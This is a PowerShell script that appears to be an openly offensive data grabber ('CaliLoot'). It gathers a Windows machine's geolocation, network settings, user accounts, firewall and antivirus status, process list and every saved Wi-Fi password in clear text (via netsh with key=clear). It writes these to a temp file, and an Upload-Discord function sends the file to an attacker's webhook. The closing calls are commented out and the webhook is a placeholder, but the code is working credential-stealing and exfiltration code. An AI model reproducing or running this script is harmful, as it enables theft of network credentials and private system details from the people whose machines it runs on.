function Get-Recon {
    $ipInfoApiUrl = "http://ip-api.com/json"
    $outputFile = "$env:TEMP\CaliLoot.txt"
	
	Function Get-Networks {
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

$WLANProfileNames =@()

$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

Foreach($WLANProfileName in $WLANProfileNames){

    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject    
}
return $WLANProfileObjects
}

    try {
        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get
        if ($response.status -eq 'success') {
            $geoData = @{
                'IP'          = $response.query
                'Country'     = $response.country
                'Region'      = $response.regionName
                'City'        = $response.city
                'Latitude'    = $response.lat
                'Longitude'   = $response.lon
                'TimeZone'    = $response.timezone
                'ISP'         = $response.isp
            }
            $geoData | Out-File -FilePath $outputFile

            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
            if ($networkConfig) {
                $networkData = @{
                    'PrivateIP'     = $networkConfig.IPAddress[0]
                    'Subnet'        = $networkConfig.IPSubnet[0]
                    'DefaultGateway' = $networkConfig.DefaultIPGateway[0]
                    'DNS'           = $networkConfig.DNSServerSearchOrder -join ', '
                }
                $networkData | Out-File -FilePath $outputFile -Append
            }
            else {
                "Network configuration not found." | Out-File -FilePath $outputFile -Append
            }

            "Users on the system:" | Out-File -FilePath $outputFile -Append
            Get-WmiObject Win32_UserAccount | ForEach-Object {
                "- $($_.Name)" | Out-File -FilePath $outputFile -Append
            }

            $firewallStatus = Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled
            "Firewall Status: $firewallStatus" | Out-File -FilePath $outputFile -Append

            $antivirus = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct"
            if ($antivirus) {
                $antivirusData = @{
                    'Name'     = $antivirus.DisplayName
                    'State'    = $antivirus.ProductState
                }
                $antivirusData | Out-File -FilePath $outputFile -Append
            }
            else {
                "Antivirus information not found." | Out-File -FilePath $outputFile -Append
            }

            "Wifi SSIDs and Passwords:" | Out-File -FilePath $outputFile -Append
            Get-Networks | ForEach-Object {
                "SSID: $($_.ProfileName), Password: $($_.ProfilePassword)" | Out-File -FilePath $outputFile -Append
            }
			
            "Computer Information:" | Out-File -FilePath $outputFile -Append
            Get-ComputerInfo | Out-File -FilePath $outputFile -Append

            "Process Information:" | Out-File -FilePath $outputFile -Append
            Get-Process | Out-File -FilePath $outputFile -Append
        }
        else {
            "Failed to retrieve geolocation information." | Out-File -FilePath $outputFile -Append
        }
    }
    catch {
        "An error occurred while trying to fetch geolocation and network data: $_" | Out-File -FilePath $outputFile -Append
    }
}

function Upload-Discord {
    param (
        [string]$file,
        [string]$text,
        [string]$webhookUrl
    )

    if ($text) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }
    }
    elseif ($file) {
        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)
    }
}

#Get-Recon

#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
